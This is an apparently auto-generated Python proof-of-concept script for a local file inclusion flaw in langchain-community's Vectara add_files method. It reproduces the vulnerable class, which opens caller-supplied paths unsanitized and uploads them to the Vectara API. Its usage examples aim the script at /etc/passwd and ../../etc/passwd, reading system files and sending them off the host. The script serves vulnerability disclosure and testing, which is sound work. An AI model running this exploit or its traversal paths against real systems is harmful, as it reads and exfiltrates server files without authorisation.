#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-008
# Sink: add_files
# Auto-generated — run with: python3 lfi_provide_like_add_files_6.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Local File Inclusion (LFI) in langchain-community Vectara.from_files

Vulnerability: The add_files() method in Vectara vectorstore opens user-supplied file paths
directly without sanitization. An attacker can supply a path like '../../etc/passwd' to read
arbitrary files from the server's filesystem and exfiltrate them to Vectara's API.

This PoC demonstrates the vulnerability by attempting to read /etc/passwd (or a benign test file)
and send it to a configurable target endpoint. For safety, it defaults to a harmless local file.
"""

import os
import sys
import json
import tempfile
import argparse
from pathlib import Path
from typing import List, Optional, Dict, Any
import requests

# ---------------------------------------------------------------------------
# Simulated vulnerable class (mirrors the actual langchain-community code)
# ---------------------------------------------------------------------------
class VectaraVulnerable:
    """
    Simplified reproduction of the vulnerable Vectara vectorstore class.
    Only includes the add_files method with the LFI vulnerability.
    """
    
    def __init__(self, 
                 vectara_customer_id: str = "test_customer",
                 vectara_corpus_id: str = "test_corpus",
                 vectara_api_key: str = "test_key",
                 vectara_api_timeout: int = 30):
        self._vectara_customer_id = vectara_customer_id
        self._vectara_corpus_id = vectara_corpus_id
        self._vectara_api_key = vectara_api_key
        self.vectara_api_timeout = vectara_api_timeout
        self._session = requests.Session()
        self._session.headers.update({
            "x-api-key": self._vectara_api_key,
            "Content-Type": "application/json"
        })
    
    def _get_post_headers(self) -> Dict[str, str]:
        """Return headers for POST requests (simulated)."""
        return dict(self._session.headers)
    
    def add_files(self, 
                  files_list: List[str], 
                  metadatas: Optional[List[Dict[str, Any]]] = None) -> List[str]:
        """
        VULNERABLE: Directly opens user-supplied file paths without sanitization.
        
        Args:
            files_list: Iterable of strings, each representing a local file path.
            metadatas: Optional list of metadatas associated with each file.
            
        Returns:
            List of document IDs from Vectara API.
        """
        doc_ids = []
        for inx, file in enumerate(files_list):
            # The only check is os.path.exists - no path sanitization!
            if not os.path.exists(file):
                print(f"[!] File {file} does not exist, skipping")
                continue
            
            md = metadatas[inx] if metadatas else {}
            
            # VULNERABLE: open() called with user-controlled path
            # This allows path traversal like '../../etc/passwd'
            files: dict = {
                "file": (file, open(file, "rb")),
                "doc_metadata": json.dumps(md),
            }
            
            headers = self._get_post_headers()
            headers.pop("Content-Type", None)
            
            try:
                response = self._session.post(
                    f"https://api.vectara.io/upload?c={self._vectara_customer_id}&o={self._vectara_corpus_id}&d=True",
                    files=files,
                    verify=True,
                    headers=headers,
                    timeout=self.vectara_api_timeout,
                )
                
                if response.status_code == 409:
                    doc_id = response.json()["document"]["documentId"]
                    print(f"[*] File {file} already exists (doc_id={doc_id}), skipping")
                elif response.status_code == 200:
                    doc_id = response.json()["document"]["documentId"]
                    doc_ids.append(doc_id)
                    print(f"[+] Successfully uploaded {file} (doc_id={doc_id})")
                else:
                    print(f"[!] Error indexing file {file}: {response.text}")
                    
            except requests.exceptions.RequestException as e:
                print(f"[!] Network error uploading {file}: {e}")
                continue
            except (KeyError, json.JSONDecodeError) as e:
                print(f"[!] Error parsing response for {file}: {e}")
                continue
            finally:
                # Ensure file handle is closed
                files["file"][1].close()
        
        return doc_ids
    
    @classmethod
    def from_files(cls, 
                   files: List[str], 
                   metadatas: Optional[List[Dict[str, Any]]] = None,
                   **kwargs) -> "VectaraVulnerable":
        """
        Entry point that creates instance and calls add_files.
        This is the public API that receives untrusted input.
        """
        vectara = cls(**kwargs)
        vectara.add_files(files, metadatas)
        return vectara


# ---------------------------------------------------------------------------
# PoC Exploit
# ---------------------------------------------------------------------------
def create_benign_test_file() -> str:
    """Create a harmless test file to demonstrate the vulnerability safely."""
    test_content = "This is a benign test file for PoC demonstration.\n"
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
        f.write(test_content)
        return f.name


def exploit_lfi(target_file: str, 
                vectara_customer_id: str = "test",
                vectara_corpus_id: str = "test",
                vectara_api_key: str = "test",
                timeout: int = 10) -> None:
    """
    Demonstrate the LFI vulnerability by attempting to read target_file
    and send it to Vectara's API.
    
    Args:
        target_file: Path to file to read (e.g., '/etc/passwd' or '../../etc/passwd')
        vectara_customer_id: Vectara customer ID (can be dummy for PoC)
        vectara_corpus_id: Vectara corpus ID (can be dummy for PoC)
        vectara_api_key: Vectara API key (can be dummy for PoC)
        timeout: Request timeout in seconds
    """
    print(f"[*] Attempting LFI with target file: {target_file}")
    print(f"[*] Target Vectara endpoint: https://api.vectara.io/upload")
    print(f"[*] Customer ID: {vectara_customer_id}")
    print(f"[*] Corpus ID: {vectara_corpus_id}")
    print()
    
    # Create vulnerable instance
    vectara = VectaraVulnerable(
        vectara_customer_id=vectara_customer_id,
        vectara_corpus_id=vectara_corpus_id,
        vectara_api_key=vectara_api_key,
        vectara_api_timeout=timeout
    )
    
    # Attempt to read the target file
    try:
        doc_ids = vectara.add_files([target_file])
        if doc_ids:
            print(f"\n[+] Exploit succeeded! Document IDs: {doc_ids}")
            print(f"[+] The file '{target_file}' was read and sent to Vectara API.")
        else:
            print(f"\n[-] No documents were uploaded (file may not exist or API rejected it)")
    except Exception as e:
        print(f"\n[!] Exploit failed with error: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="PoC: LFI in langchain-community Vectara.from_files",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test with a benign local file (safe default)
  python poc_lfi.py
  
  # Test with /etc/passwd (requires actual Vectara credentials)
  python poc_lfi.py --target /etc/passwd --customer-id YOUR_CID --corpus-id YOUR_CORPUS --api-key YOUR_KEY
  
  # Test with path traversal
  python poc_lfi.py --target ../../etc/passwd --customer-id YOUR_CID --corpus-id YOUR_CORPUS --api-key YOUR_KEY
        """
    )
    
    parser.add_argument(
        "--target", "-t",
        type=str,
        default=None,
        help="Target file path to read (default: creates a benign test file)"
    )
    parser.add_argument(
        "--customer-id", "-c",
        type=str,
        default="test_customer",
        help="Vectara customer ID (default: test_customer)"
    )
    parser.add_argument(
        "--corpus-id", "-o",
        type=str,
        default="test_corpus",
        help="Vectara corpus ID (default: test_corpus)"
    )
    parser.add_argument(
        "--api-key", "-k",
        type=str,
        default="test_key",
        help="Vectara API key (default: test_key)"
    )
    parser.add_argument(
        "--timeout", "-T",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)"
    )
    
    args = parser.parse_args()
    
    # If no target specified, create a benign test file
    if args.target is None:
        print("[*] No target specified, creating benign test file...")
        test_file = create_benign_test_file()
        print(f"[*] Created test file: {test_file}")
        print(f"[*] Contents: 'This is a benign test file for PoC demonstration.'")
        print()
        target = test_file
    else:
        target = args.target
    
    # Run the exploit
    exploit_lfi(
        target_file=target,
        vectara_customer_id=args.customer_id,
        vectara_corpus_id=args.corpus_id,
        vectara_api_key=args.api_key,
        timeout=args.timeout
    )
    
    # Clean up test file if we created one
    if args.target is None and os.path.exists(target):
        os.unlink(target)
        print(f"[*] Cleaned up test file: {target}")


if __name__ == "__main__":
    print("=" * 60)
    print("PoC: LFI in langchain-community Vectara.from_files")
    print("=" * 60)
    print()
    print("[*] This PoC demonstrates how an attacker can read arbitrary files")
    print("[*] by exploiting the lack of path sanitization in add_files().")
    print("[*] The vulnerable code directly opens user-supplied paths with open().")
    print()
    
    main()
